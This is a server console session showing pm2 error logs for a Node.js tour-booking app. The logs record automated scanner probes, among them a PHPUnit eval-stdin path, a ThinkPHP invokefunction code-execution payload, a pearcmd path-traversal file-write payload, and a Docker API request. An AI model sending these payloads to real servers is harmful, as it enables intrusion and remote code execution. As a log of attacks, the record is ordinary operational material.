[root@archlinux bunyod-tour]# pm2 logs bunyod-tour --lines 50
[TAILING] Tailing last 50 lines for [bunyod-tour] process (change the value with --lines option)
/srv/bunyod-tour/logs/pm2-error.log last 50 lines:
0|bunyod-t | 2025-11-17T12:00:56: Global error handler: URIError: URI malformed
0|bunyod-t | 2025-11-17T12:23:45: 🔄 Middleware check - Decoded URL: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
0|bunyod-t | 2025-11-17T12:23:45: 🔄 Middleware check - Original URL: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
0|bunyod-t | 2025-11-17T12:23:45: 🔄 Middleware check - Decoded URL: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Original URL: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Decoded URL: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Original URL: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Decoded URL: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Original URL: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Decoded URL: /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Original URL: /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Decoded URL: /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Original URL: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
0|bunyod-t | 2025-11-17T12:23:46: 🔄 Middleware check - Decoded URL: /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
0|bunyod-t | 2025-11-17T12:23:47: 🔄 Middleware check - Original URL: /index.php?lang=../../../../../../../../tmp/index1
0|bunyod-t | 2025-11-17T12:23:47: 🔄 Middleware check - Decoded URL: /index.php?lang=../../../../../../../../tmp/index1
0|bunyod-t | 2025-11-17T12:23:47: 🔄 Middleware check - Original URL: /containers/json
0|bunyod-t | 2025-11-17T12:23:47: 🔄 Middleware check - Decoded URL: /containers/json
